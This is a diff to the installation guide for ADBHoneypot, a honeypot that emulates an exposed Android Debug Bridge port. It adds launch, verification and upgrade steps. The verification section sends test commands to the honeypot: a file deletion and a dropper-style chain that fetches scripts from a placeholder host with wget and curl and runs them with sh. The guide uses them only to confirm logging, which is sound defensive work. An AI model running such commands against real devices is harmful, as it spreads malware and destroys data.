@@ -10,11 +10,13 @@
   - [Configure Additional Output Plugins (OPTIONAL)](#configure-additional-output-plugins-optional)
   - [Command-line options](#command-line-options)
   - [Log rotation](#log-rotation)
+  - [Verifying that the honeypot works](#verifying-that-the-honeypot-works)
+  - [Upgrading ADBHoneypot](#upgrading-adbhoneypot)
 
 ## Step 1: Install dependencies
 
-First we install system-wide support for Python virtual environments and other dependencies.
-Actual Python packages are installed later.
+First we install system-wide support for Python virtual environments and other
+dependencies. Actual Python packages are installed later.
 
 For a Python2-based environment:
 
@@ -80,13 +82,15 @@ $ source adbh_env/bin/activate
 ## Step 5: Install configuration file
 
 The configuration for the honeypot is stored in `etc/adbhoney.cfg.base` and
-`adbhoney.cfg`. Both files are read on startup, where entries from
-`adbhoney.cfg` take precedence. The `.base` file contains the default settings and can be overwritten by
-upgrades, while `adbhoney.cfg` will not be touched. To run with a standard
-configuration, there is no need to change anything.
+`etc/adbhoney.cfg`. Both files are read on startup but the entries from
+`etc/adbhoney.cfg` take precedence. The `.base` file contains the default
+settings and can be overwritten by upgrades, while `adbhoney.cfg` will not be
+touched. To run with a standard configuration, there is no need to change
+anything.
 
-For instance, in order to enable JSON logging, and to store the captured samples in a directory named `dl`,
-create `adbhoney.cfg` and put in it only the following:
+For instance, in order to enable JSON logging, and to store the captured
+samples in a directory named `dl`, create `etc/adbhoney.cfg` and put in it
+only the following:
 
 ```adbhoney.cfg
 [honeypot]
@@ -98,27 +102,54 @@ logfile = log/adbhoney.json
 epoch_timestamp = true
 ```
 
-For more information about how to configure additional output plugins (from the available ones),
-please consult the appropriate `INSTALL.md` file in the subdirectory corresponding to the plugin
-inside the `docs` directory.
+For more information about how to configure additional output plugins (from
+the available ones), please consult the appropriate `README.md` file in the
+subdirectory corresponding to the plugin inside the `docs` directory.
 
 ## Step 6: Starting ADBHoneypot
 
+Before starting the honeypot, make sure that you have specified correctly
+where it should look for the virtual environment. This documentation suggests
+that you create it in `/home/adbh/adbhoneypot/adbh_env/`. If you have indeed
+created it there, there is no need to change anything. If, however, you have
+created it elsewhere, you have to do the following:
+
+- Make a copy of the file `adbhoney-launch.cfg.base`:
+
 ```bash
-nohup python adbhoney.py &>/dev/null &
+$ pwd
+/home/adbh/adbhoneypot
+cd etc
+cp adbhoney-launch.cfg.base adbhoney-launch.cfg
+cd ..
+```
+
+- Edit the file `/home/adbh/adbhoneypot/etc/adbhoney-launch.cfg` and change the
+  setting of the variable `ADB_VIRTUAL_ENV` to point to the directory where your
+  virtual environment is.
+
+Now you can launch the honeypot:
+
+```bash
+$ pwd
+/home/adbh/adbhoneypot
+./bin/adbhoney start
+Starting ADBhoneypot ...
+ADBhoneypot is started successfully.
 ```
 
 ## Configure Additional Output Plugins (OPTIONAL)
 
-ADBHoneypot automatically outputs event data to text in `log/adbhoney.log`. Additional output
-plugins can be configured to record the data other ways. Supported output plugins include:
+ADBHoneypot automatically outputs event data to text in `log/adbhoney.log`.
+Additional output plugins can be configured to record the data other ways.
+Supported output plugins include:
 
-* JSON
-* SQL (MySQL, SQLite3)
+- JSON
+- SQL (MySQL, SQLite3)
 
 More plugins are likely to be added in the future.
 
-See `~/adbh/adbhoneypot/docs/[Output Plugin]/README.md` for details.
+See `docs/[Output Plugin]/README.md` for details.
 
 ## Command-line options
 
@@ -138,13 +169,14 @@ ADBHoneypot supports the following command-line options:
   -b, --debug           Produce verbose output
 ```
 
-The settings specified via command-line options take precedence over the corresponding settings in the `.cfg` files.
+The settings specified via command-line options take precedence over the
+corresponding settings in the `.cfg` files.
 
 ## Log rotation
 
-You can use the system utility `logrotate` to rotate the logs. For instance, in order to keep one day
-worth of text and JSON logs for up to a year, create a file `~/adbhoneypot/logrotate.conf` with the
-following contents:
+You can use the system utility `logrotate` to rotate the logs. For instance,
+in order to keep one day worth of text and JSON logs for up to a year, create
+a file `~/adbhoneypot/logrotate.conf` with the following contents:
 
 ```logrotate
 /home/adbh/adbhoneypot/log/adbhoney.log {
@@ -168,7 +200,8 @@ following contents:
 }
 ```
 
-Change the log directory and file names above if you haven't used the default values.
+Change the log directory and file names above if you haven't used the default
+values.
 
 Then create a crontab job (`crontab -e`) to run logrotate daily:
 
@@ -176,5 +209,80 @@ Then create a crontab job (`crontab -e`) to run logrotate daily:
 @daily /usr/sbin/logrotate -s /home/adbh/adbhoneypot/logrotate.status /home/adbh/adbhoneypot/logrotate.conf
 ```
 
-A future version of the honeypot is likely to do log rotation itself, instead of
-relying on an external utility.
+A future version of the honeypot is likely to do log rotation itself, instead
+of relying on an external utility.
+
+## Verifying that the honeypot works
+
+- From a user who can `sudo` (i.e., not from `adbh`), make sure that `adb` is installed:
+
+```bash
+sudo apt-get update
+sudo apt-get install adb
+```
+
+(If installing `adb` from the package `adb` does not work for some reason, install
+it from the package `android-tools-adb`.)
+
+- Switch to the user `adbh` and start the honeypot:
+
+```bash
+sudo su - adbh
+cd adbhoneypot
+./bin/adbhoney start
+```
+
+- Open a new terminal and scan `localhost`:
+
+```bash
+nmap -p 5555 127.0.0.1
+```
+
+This should result in a log entry that a connection has been made and then closed.
+
+- Connect to the honeypot via `adb`:
+
+```bash
+$ adb connect 127.0.0.1:5555
+* daemon not running. starting it now on port 5037 *
+* daemon started successfully *
+connected to 127.0.0.1:5555
+
+$ adb devices
+List of devices attached
+emulator-5554	device
+127.0.0.1:5555	device
+```
+
+- Send a file to the honeypot:
+
+```bash
+$ adb -s 127.0.0.1:5555  push -p filename /sdcard/
+Transferring: 5078064/5078064 (100%)
+4805 KB/s (5078064 bytes in 1.031s)
+```
+
+The honeypot should log the file transfer and save a copy of the file
+in the download directory.
+
+- Execute shell commands on the honeypot:
+
+```bash
+adb -s 127.0.0.1:5555 shell "rm -rf /data/local/tmp/*"
+adb -s 127.0.0.1:5555 shell "cd /data/local/tmp;wget http://yyy.yyy.yyy.yyy/br -O- >br;sh br;busybox wget http://yyy.yyy.yyy.yyy/r -O- >r;sh r;curl http://yyy.yyy.yyy.yyy/c >c;sh c;busybox curl http://yyy.yyy.yyy.yyy/bc >bc;sh bc"
+```
+
+The log file should reflect the attempts to run these commands.
+
+## Upgrading ADBHoneypot
+
+Updating is an easy process. First stop your honeypot. Then fetch any
+available updates from the repository. As a final step upgrade your Python
+dependencies:
+
+```bash
+./bin/adbhoney stop
+git pull
+pip install --upgrade -r requirements.txt
+./bin/adbhoney start
+```
